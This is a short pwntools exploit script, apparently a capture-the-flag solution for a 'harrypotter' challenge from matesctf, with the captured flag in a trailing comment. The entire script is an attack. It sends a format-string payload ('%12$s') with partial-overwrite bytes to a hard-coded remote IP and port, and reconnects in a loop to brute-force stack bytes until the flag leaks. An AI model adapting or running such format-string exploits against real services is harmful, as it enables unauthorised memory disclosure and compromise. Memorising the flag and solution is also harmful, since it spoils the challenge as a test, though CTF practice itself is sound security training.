from pwn import *
def harrypotter():
	HOST = '125.235.240.168'
	PORT = 27017
	def connect():
		# return process("./harrypotter")
		return remote(HOST,PORT)
		
	context.log_level = "critical"
	payload = "%12$s"
	payload = payload.ljust(0x30,"B")
	payload += "\xf0" # bruteforce 1.5 bytes stack
	payload += "\x95" 
	count = 0
	while 1:
		print count
		count += 1
		r = connect()
		r.recvuntil("It's time to cast your spell\n")
		r.send(payload)
		try:
			res = r.recv()
		except:
			r.close()
			continue
		if "matesctf{" in res and "matesctf{}" not in res:
			print res
			break
		r.close()

harrypotter()
# matesctf{wingalium_leviosaaaaaaaaaaaaaaaaaaaaaaa_hahaha}